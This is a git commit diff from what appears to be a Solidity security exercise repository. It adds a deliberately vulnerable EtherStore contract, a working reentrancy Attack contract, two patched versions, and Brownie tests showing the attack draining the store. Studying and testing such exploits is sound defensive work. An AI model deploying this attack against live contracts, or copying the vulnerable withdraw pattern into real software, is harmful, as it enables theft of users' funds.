131efe3695dfb8ea7cc2192e999b69e0503a4a66
Tang Wei <wei.tang@coinflex.com>
2021-10-14 15:20:47 +0800

    reentrancy attack test and secure solution for the contract

--- contracts/reentrancy/Reentrancy.sol
+++ contracts/reentrancy/Reentrancy.sol
@@ -3,8 +3,6 @@ pragma solidity ^0.6.10;
 contract EtherStore {
 	mapping(address => uint) public balances;
 
-	constructor() public payable {}
-
 	function deposit() public payable {
 		balances[msg.sender] += msg.value;
 	}
@@ -15,6 +13,82 @@ contract EtherStore {
 		(bool sent,) = msg.sender.call{value: _amount}("");
 		require(sent, "Failed to send Ether");
 
+		balances[msg.sender] -= _amount;
+	}
+
+	function getBalance() public view returns (uint) {
+		return address(this).balance;
+	}
+}
+
+contract Attack {
+	EtherStore public etherStore;
+
+	constructor(address _etherStoreAddress) public {
+		etherStore = EtherStore(_etherStoreAddress);
+	}
+
+	fallback() external payable {
+		if (address(etherStore).balance >= 1 ether) {
+			etherStore.withdraw(1 ether);
+		} 
+	}
+
+	function attack() external payable {
+		require(msg.value >= 1 ether);
+
+		etherStore.deposit{value: 1 ether}();
+		etherStore.withdraw(1 ether);
+	}
+
+	function getBalance() public view returns (uint) {
+		return address(this).balance;
+	}
+}
+
+contract EtherStoreSecure1 {
+	mapping(address => uint) public balances;
+
+	function deposit() public payable {
+		balances[msg.sender] += msg.value;
+	}
+
+	function withdraw(uint _amount) public {
+		require(balances[msg.sender] >= _amount);
+		
+		balances[msg.sender] -= _amount;
+
+		(bool sent,) = msg.sender.call{value: _amount}("");
+		require(sent, "Failed to send Ether");
+	}
+
+	function getBalance() public view returns (uint) {
+		return address(this).balance;
+	}
+}
+
+contract EtherStoreSecure2 {
+	mapping(address => uint) public balances;
+
+	function deposit() public payable {
+		balances[msg.sender] += msg.value;
+	}
+
+	bool internal locked;
+
+	modifier noReentrant() {
+		require(!locked, "No re-entrancy");
+		locked = true;
+		_;
+		locked = false;
+	}
+
+	function withdraw(uint _amount) public noReentrant {
+		require(balances[msg.sender] >= _amount);
+		
+		(bool sent,) = msg.sender.call{value: _amount}("");
+		require(sent, "Failed to send Ether");
+		
 		balances[msg.sender] -= _amount;
 	}
 
--- tests/test_reentrancy.py
+++ tests/test_reentrancy.py
@@ -8,15 +8,61 @@ def alice(accounts):
 def bob(accounts):
     return accounts[1]
 
+@pytest.fixture(scope='module')
+def eve(accounts):
+    return accounts[2]
+
 @pytest.fixture
-def etherStore(EtherStore, alice):
-    return EtherStore.deploy({'from': alice, 'value': '100 ether'})
+def etherStore(EtherStore, alice, bob):
+    etherStore = EtherStore.deploy({'from': alice})
+    etherStore.deposit({'from': alice, 'value': '1 ether'})
+    etherStore.deposit({'from': bob, 'value': '1 ether'})
+    assert etherStore.getBalance() == '2 ether'
+    return etherStore
 
-def test_normal_usage(etherStore, bob):
-    assert etherStore.getBalance() == '100 ether'
-    assert etherStore.balances(bob) == 0
-    etherStore.deposit({'from': bob, 'value': '5 ether'})
-    assert etherStore.getBalance() == '105 ether'
-    assert etherStore.balances(bob) == '5 ether'
+@pytest.fixture
+def attack(Attack, etherStore, alice):
+    return Attack.deploy(etherStore.address, {'from': alice})
+
+@pytest.fixture
+def etherStoreSecure1(EtherStoreSecure1, alice, bob):
+    etherStoreSecure1 = EtherStoreSecure1.deploy({'from': alice})
+    etherStoreSecure1.deposit({'from': alice, 'value': '1 ether'})
+    etherStoreSecure1.deposit({'from': bob, 'value': '1 ether'})
+    assert etherStoreSecure1.getBalance() == '2 ether'
+    return etherStoreSecure1
+
+@pytest.fixture
+def attack1(Attack, etherStoreSecure1, alice):
+    return Attack.deploy(etherStoreSecure1.address, {'from': alice})
+
+@pytest.fixture
+def etherStoreSecure2(EtherStoreSecure2, alice, bob):
+    etherStoreSecure2 = EtherStoreSecure2.deploy({'from': alice})
+    etherStoreSecure2.deposit({'from': alice, 'value': '1 ether'})
+    etherStoreSecure2.deposit({'from': bob, 'value': '1 ether'})
+    assert etherStoreSecure2.getBalance() == '2 ether'
+    return etherStoreSecure2
+
+@pytest.fixture
+def attack2(Attack, etherStoreSecure2, alice):
+    return Attack.deploy(etherStoreSecure2.address, {'from': alice})
 
 
+def test_normal_usage(etherStore, eve):
+    assert etherStore.balances(eve) == 0
+    etherStore.deposit({'from': eve, 'value': '1 ether'})
+    assert etherStore.getBalance() == '3 ether'
+    assert etherStore.balances(eve) == '1 ether'
+    etherStore.withdraw('1 ether', {'from': eve})
+    assert etherStore.getBalance() == '2 ether'
+    assert etherStore.balances(eve) == 0
+
+def test_reentrancy_attack(etherStore, attack, eve):
+    assert etherStore.balances(eve) == 0
+    attack.attack({'from': eve, 'value': '1 ether'})
+    assert etherStore.getBalance() == 0
+    assert etherStore.balances(eve) == 0
+    assert attack.getBalance() == '3 ether'
+
+# def test_reentrancy_secure1_attack(etherStore, attack, eve)
